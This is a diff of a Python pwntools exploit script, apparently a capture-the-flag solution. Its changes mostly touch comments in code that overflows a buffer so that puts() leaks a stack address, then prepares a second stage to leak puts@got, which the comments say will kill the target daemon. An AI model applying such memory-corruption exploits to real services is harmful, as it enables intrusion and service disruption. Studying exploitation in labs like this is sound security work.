@@ -32,7 +32,7 @@ if __name__ == "__main__":
     payload = ""
     payload += p64(9)
     payload += p64(0xcafebabedeadbeef) 
-    payload += "A" # overwrite NULL (unless puts() will terminate before the stored rbp)
+    payload += "A" # overwrite NULL (unless puts() would terminate before the stored rbp)
 
     r.send(payload)
     resp = r.recv()
@@ -41,13 +41,13 @@ if __name__ == "__main__":
 # sub_4004E6() pushes rbp into the stack
 # so we can leak the address with puts()
 #
-# 0xcafebabedeadbeef + 'A' + 
-# ef:be:ad:de:be:ba:fe:ca:41: a0:ad:0f:93:7f: 0a
+# cafebabe deadbeef + 'A' + addr + '\n'
+# ef:be:ad:de:be:ba:fe:ca: 41: a0:ad:0f:93:7f: 0a
 
 # leak rbp
 
     mmap = resp[9:14]
-    mmap = "\x00" + mmap + "\x00\x00"
+    mmap = "\x00" + mmap + "\x00\x00" # replace 'A' with NULL
     mmap = u64(mmap)
 
     mmap -= 0x2000
@@ -57,7 +57,7 @@ if __name__ == "__main__":
 
 # Stage 2
 #
-# leak puts@got (will kill the daemon)
+# leak puts@got (and will kill the daemon)
 # store puts@got+8 into rbp & jump to 0x40051f
 
     PUTS_GOT = b.got['puts']
